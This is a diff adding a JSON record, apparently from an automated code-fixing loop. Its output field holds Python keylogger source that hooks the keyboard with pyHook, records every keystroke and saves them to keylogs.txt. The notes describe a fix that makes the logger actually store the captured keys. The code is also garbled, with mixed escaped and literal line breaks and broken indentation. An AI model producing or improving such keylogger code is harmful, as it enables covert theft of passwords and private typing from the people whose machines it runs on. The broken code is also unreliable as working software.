@@ -1,0 +1,8 @@
+{
+  "output": "import pyHook, pythoncom\\nh = pyHook.HookManager()\\nkeylogs = []\\n\ndef OnKeyboardEvent(event):\\n\tif event.Ascii in range(32, 127) or event.Ascii == 0:\\n\t\tif len(str(event.Key)) > 1:\\n\t\t\tthekey = str(event.Key)\\n\t\telse:\\n\t\t\tthekey = chr(event.Ascii)\\n\t\tprint(thekey, end='')\\n\\t\tkeylogs.append(thekey)\\n\treturn True\\n\nh.KeyDown = OnKeyboardEvent\\nh.HookKeyboard()\\ntry:\\n\th.start()\\nexcept KeyboardInterrupt:\\n\th.stop()\\nwith open('keylogs.txt', 'w') as f:\nf.write(''.join(keylogs))",
+  "notes": "Fixed issue iteration4_issue1 by populating the keylogs list within OnKeyboardEvent function.",
+  "applied_fixes": [
+    "iteration4_issue1"
+  ],
+  "iterations": 5
+}
